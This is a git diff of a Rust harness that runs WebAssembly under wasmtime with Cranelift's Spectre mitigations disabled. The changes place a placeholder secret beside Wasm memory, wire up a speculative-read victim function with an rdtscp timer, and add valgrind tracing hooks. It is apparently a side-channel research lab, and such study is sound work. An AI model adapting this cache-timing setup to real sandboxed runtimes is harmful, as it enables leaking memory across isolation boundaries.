@@ -5,11 +5,13 @@ use std::arch::x86_64::_mm_clflush;
 use std::arch::x86_64::_mm_lfence;
 #[cfg(all(target_arch = "x86_64"))]
 use std::arch::x86_64::_mm_mfence;
-#[cfg(all(target_arch = "x86_64"))]
-use std::arch::x86_64::_rdtsc;
 use std::io::Write;
 use wasmtime::*;
 use wasmtime_wasi::sync::WasiCtxBuilder;
+use std::sync::Arc;
+use std::sync::Mutex;
+use std::ops::Range;
+use std::ffi::c_void;
 
 const STRIDE: usize = 256;
 const PAD: usize = 160;
@@ -21,10 +23,181 @@ static mut public_data: [u8; PAD] = [2; PAD/*pad here*/];
 // TODO add padding to match the cache line size
 // We need to pad the array to make cache lines aligned
 // const array_for_prediction: [u8; 256 * STRIDE] = [0; 256 * STRIDE];
-const secret_data: &str = "My password";
 static mut tmp: u8 = 0;
 
 pub static mut exfiltrated: Vec<u8> = vec![];
+
+
+static mut NEWMEMCOUNT: u32 = 0;
+const SCALE: usize = 1;
+static mut STATIC_ADDRESS_START: *mut c_void = 0x2000_0000 as *mut c_void;
+static mut STATIC_ADDRESS: *mut c_void = 0x2000_0000 as *mut c_void;
+static mut STATIC_ADDRESS2: *mut c_void = 0x1000_0000 as *mut c_void;
+// Allocate SECRET 
+
+
+
+struct MemoryAllocator;
+
+struct OwnMemory  {
+    pub ptr: Arc<Mutex<*mut u8>>,
+    pub size: usize
+}
+
+unsafe impl Send for OwnMemory {}
+unsafe impl Sync for OwnMemory {}
+
+unsafe impl wasmtime::LinearMemory for OwnMemory {
+    
+    fn byte_size(&self) -> usize {
+        self.size
+    }
+
+    fn maximum_byte_size(&self) -> Option<usize> {
+        Some(self.size)
+    }
+
+    fn wasm_accessible(&self) -> Range<usize> {
+        0..self.size + 1
+    }
+
+    fn as_ptr(&self) -> *mut u8 {
+        self.ptr.lock().unwrap().clone()
+    }
+
+    fn grow_to(&mut self, new_size: usize) -> Result<()> {
+        Ok(())
+    }
+
+
+}
+
+impl OwnMemory {
+
+
+    pub fn new(ptr: *mut u8, size: usize) -> Self {
+        Self {
+            ptr: Arc::new(Mutex::new(ptr)), size
+        }
+    }
+}
+
+unsafe impl wasmtime::MemoryCreator for MemoryAllocator {
+
+    fn new_memory(
+        &self,
+        ty: MemoryType,
+        minimum: usize,
+        maximum: Option<usize>,
+        reserved_size_in_bytes: Option<usize>,
+        guard_size_in_bytes: usize
+    ) -> Result<Box<dyn LinearMemory>, String> {
+        // eprintln!("ty {:?}", ty);
+        eprintln!("reserved_size_in_bytes {:?}", reserved_size_in_bytes);
+        // * WASM_PAGE_SIZE
+        // To shrink the allocated memory for the binary just set the number below to 0.5 for example
+        // TODO make this and option
+        let PSIZE: f32 = 0.01;
+        let total_bytes = match maximum {
+            Some(max) => (max as f32 *PSIZE) as usize,
+            None => (minimum as f32*PSIZE) as usize,
+        };
+        eprintln!("total_bytes {:?}", total_bytes);
+
+        unsafe { eprintln!("mem at {:?}({})", STATIC_ADDRESS, total_bytes) };
+        
+        let mem = unsafe {
+            let r = rustix::mm::mmap_anonymous(
+                STATIC_ADDRESS,
+                total_bytes,
+                rustix::mm::ProtFlags::READ | rustix::mm::ProtFlags::WRITE,
+                rustix::mm::MapFlags::PRIVATE, // | rustix::mm::MapFlags::FIXED,
+            ).expect("Memory could not be allocated");
+            STATIC_ADDRESS = STATIC_ADDRESS.add(total_bytes + PAD);
+            r
+        };
+
+        let linearmem = OwnMemory::new(mem as *mut u8, total_bytes);
+
+        
+        Ok(Box::new(linearmem))
+    }
+}
+
+#[link(name = "valgrind")]
+extern "C" {
+    fn create_lock();
+    fn set_lock(val: u8);
+}
+
+#[no_mangle]
+pub fn notify_mem(ptr: *mut libc::c_void, size: usize){
+    eprintln!("Executable memory at {:?}({})", ptr, size);
+    // Only notify the second one to avoid the instrumentation of WASI. TODO, check if this makes sense
+    //if unsafe { NEWMEMCOUNT == 1 } {
+        // This is the module
+    //eprintln!("Calling valgrind DISCARD_TRANSLATIONS");
+    // unsafe { discard_translations(ptr, size); }
+    //}
+    //unsafe { NEWMEMCOUNT += 1; }
+}
+
+
+#[no_mangle]
+pub fn custom_reserve(size: usize) -> *mut libc::c_void {
+    let ptr = unsafe {
+        let r = rustix::mm::mmap_anonymous(
+            STATIC_ADDRESS,
+            size,
+            rustix::mm::ProtFlags::READ | rustix::mm::ProtFlags::WRITE,
+            rustix::mm::MapFlags::PRIVATE | rustix::mm::MapFlags::FIXED,
+        ).expect("Memory could not be allocated");
+        STATIC_ADDRESS = STATIC_ADDRESS.add(size + PAD);
+        r
+    };
+    
+    eprintln!("allocating at {:?}", ptr);
+    ptr
+
+}
+
+#[no_mangle]
+pub fn custom_allocator(size: usize) -> *mut libc::c_void {
+    unsafe { eprintln!("allocating at {:?} ({})", STATIC_ADDRESS2, size*SCALE) };
+
+    let ptr = unsafe {
+        let r = rustix::mm::mmap_anonymous(
+            STATIC_ADDRESS2,
+            size*SCALE,
+            rustix::mm::ProtFlags::READ | rustix::mm::ProtFlags::WRITE,
+            rustix::mm::MapFlags::PRIVATE, // rustix::mm::MapFlags::FIXED,
+        ).expect("Memory could not be allocated");
+        STATIC_ADDRESS2 = STATIC_ADDRESS2.add(size*SCALE + PAD);
+        r
+    };
+    
+    ptr
+
+}
+
+#[no_mangle]
+pub fn custom_file_allocator(size: usize, file: &std::fs::File) -> *mut libc::c_void {
+    eprintln!("Allocating file");
+    let ptr = unsafe {
+        let r = rustix::mm::mmap(
+            STATIC_ADDRESS,
+            size,
+                rustix::mm::ProtFlags::READ | rustix::mm::ProtFlags::WRITE,
+                rustix::mm::MapFlags::PRIVATE, // | rustix::mm::MapFlags::FIXED,
+                &file,
+                0,
+            ).expect("Memory could not be allocated");
+            STATIC_ADDRESS = STATIC_ADDRESS.add(size + PAD);
+        r
+    };
+    ptr
+}
+
 
 #[cfg(all(target_arch = "x86_64"))]
 #[inline]
@@ -39,6 +212,30 @@ pub fn read_memory_offset(ptr: *const u8) -> u8 {
     };
     result
 }
+
+
+#[cfg(all(target_arch="x86_64"))]
+pub fn _rdtsc() -> u64 {
+    let eax: u32;
+  let ecx: u32;
+  let edx: u32;
+  {
+    unsafe {
+      asm!(
+        "rdtscp",
+        lateout("eax") eax,
+        lateout("ecx") ecx,
+        lateout("edx") edx,
+        options(nomem, nostack)
+      );
+    }
+  }
+
+
+  let counter: u64 = (edx as u64) << 32 | eax as u64;
+  counter
+}
+
 
 pub fn create_linker(engine: &wasmtime::Engine) -> wasmtime::Linker<wasmtime_wasi::WasiCtx> {
     let mut linker = wasmtime::Linker::new(&engine);
@@ -101,13 +298,22 @@ pub fn create_linker(engine: &wasmtime::Engine) -> wasmtime::Linker<wasmtime_was
     // We force the branch training to be syncronized when the attacker starts to measure (see
     // lines 146-154 of the spectre_wasm.rs file )
     //
-    let secret_data_bytes = secret_data.as_bytes();
+    // Get the memory content
+    
+    //let secret_data_bytes = STATIC_ADDRESS_START;
+
+    let mut secret_data_bytes = unsafe { core::slice::from_raw_parts_mut(STATIC_ADDRESS_START as *mut u8, 11) };
     let linker = linker
         .func_wrap(
             "env",
             "victim_code",
             |mut caller: wasmtime::Caller<'_, _>, i: u32| {
+
+                // Trace where this is happening
+                unsafe {set_lock(0)};
+
                 // get the memory of the module
+                // In theory it should be our own allocation
                 let memory = caller.get_export("memory").unwrap().into_memory().unwrap();
                 let memory_data = memory.data(&mut caller);
 
@@ -117,10 +323,13 @@ pub fn create_linker(engine: &wasmtime::Engine) -> wasmtime::Linker<wasmtime_was
                     let addr =
                         &memory_data[secret_data_bytes[location] as usize * STRIDE] as *const u8;
                     // lets print the address for logging
-                    // println!("access {:?}", addr);
+                    //println!("access {:?}", addr);
 
                     tmp &= read_memory_offset(addr);
                 };
+
+                unsafe {set_lock(1)};
+
                 //}
             },
         )
@@ -143,6 +352,7 @@ pub fn create_linker(engine: &wasmtime::Engine) -> wasmtime::Linker<wasmtime_was
 }
 
 pub fn execute_wasm(path: String) {
+    // TODO Check if precompiled is better :"
     println!("T-> Executing {}", path);
 
     let pathcp = path.clone();
@@ -159,7 +369,10 @@ pub fn execute_wasm(path: String) {
         unsafe { config.cranelift_flag_set("enable_heap_access_spectre_mitigation", "no") };
     let config =
         unsafe { config.cranelift_flag_set("enable_table_access_spectre_mitigation", "no") };
-
+    
+    let allocator = MemoryAllocator;
+    //let mut config = config.with_host_memory(Arc::new(allocator));
+    
     // This actually produces the same default binary :|
     // let config = config.cranelift_opt_level(wasmtime::OptLevel::SpeedAndSize);
 
@@ -171,6 +384,7 @@ pub fn execute_wasm(path: String) {
     let module = wasmtime::Module::new(&engine, binary).unwrap();
 
     // Serialize it
+    // TODO check if it was already serialized, avoid compiling again
     let serialized = module.serialize().unwrap();
     // Save it to disk, get the filename from the argument path
     std::fs::write(format!("{}.obj", filename), serialized).unwrap();
@@ -185,6 +399,23 @@ pub fn execute_wasm(path: String) {
     let mut linker = create_linker(&engine);
     let mut store = wasmtime::Store::new(&engine, wasi);
 
+    /*store.call_hook(/* when the wasm execution starts, then enable the recording */ |t, tpe|{
+        match tpe {
+            // Detect if it is a WASI function
+
+            wasmtime::CallHook::CallingHost => {
+                unsafe {set_lock(1)};
+            },
+            wasmtime::CallHook::ReturningFromHost => {
+                unsafe {set_lock(0)};
+            }
+            _ => {
+
+            }
+        }
+        Ok(())
+    });*/
+    
     // let instance = linker.instantiate(&mut store, &module).unwrap();
 
     linker.module(&mut store, "", &module).unwrap();
@@ -201,6 +432,40 @@ pub fn execute_wasm(path: String) {
 }
 
 pub fn main() {
+
+    // Allocate the SECRET at the side of the Wasm memory for better accuracy
+    let ptr = unsafe {
+        let r = rustix::mm::mmap_anonymous(
+            STATIC_ADDRESS,
+            11,
+            rustix::mm::ProtFlags::READ | rustix::mm::ProtFlags::WRITE,
+            rustix::mm::MapFlags::PRIVATE | rustix::mm::MapFlags::FIXED,
+        ).expect("Memory could not be allocated");
+        STATIC_ADDRESS = STATIC_ADDRESS.add(11 + PAD);
+      
+        // Set the PTR content
+        let mut ptr = core::slice::from_raw_parts_mut(r as *mut u8, 11);
+        ptr[0] = b'M' ;
+        ptr[1] = b'y' ;
+        ptr[2] = b' ' ;
+        ptr[3] = b'p' ;
+        ptr[4] = b'a' ;
+        ptr[5] = b's' ;
+        ptr[6] = b's' ;
+        ptr[7] = b'w' ;
+        ptr[8] = b'o' ;
+        ptr[9] = b'r' ;
+        ptr[10] = b'd' ;
+        eprintln!("Setting the secret data");
+
+        r
+    };
+    eprintln!("Secret data done");
+
+    unsafe { create_lock() };
+    // Creates a lock file here
+    unsafe {set_lock(1)};
+
     // Setting up the data
     unsafe {
         public_data[0] = 1;
@@ -274,6 +539,7 @@ pub fn main() {
 
             println!("-> Executing '{}' into a separated thread", input.trim());
             print!("\r-> ");
+            break;
             std::io::stdout().flush().unwrap();
         } else if input.trim() == "exit" {
             // Wait for all threads, and the exit
